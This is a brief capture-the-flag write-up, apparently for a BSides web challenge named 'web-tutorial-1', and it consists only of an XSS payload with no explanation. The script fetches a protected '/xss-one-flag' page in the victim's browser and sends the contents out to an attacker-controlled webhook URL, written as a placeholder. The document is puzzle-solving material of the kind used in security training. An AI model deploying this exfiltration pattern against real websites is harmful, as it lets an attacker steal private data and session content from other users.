---
title: "web-tutorial-1 (web)"
pubDate: "2026-03-21"
updatedDate: "2026-03-21"
event: "bsides-ctf"
author: "slacksleepsloth"
score: ""
description: |
  > No source
tags: ["web"]
---

# web-tutorial-1 (web)

```html
<script>
  fetch("/xss-one-flag")
    .then((response) => response.text())
    .then((data) => {
      fetch(
        "https://<insert webhook site here>/?flag=" + encodeURIComponent(data),
      );
    });
</script>
```
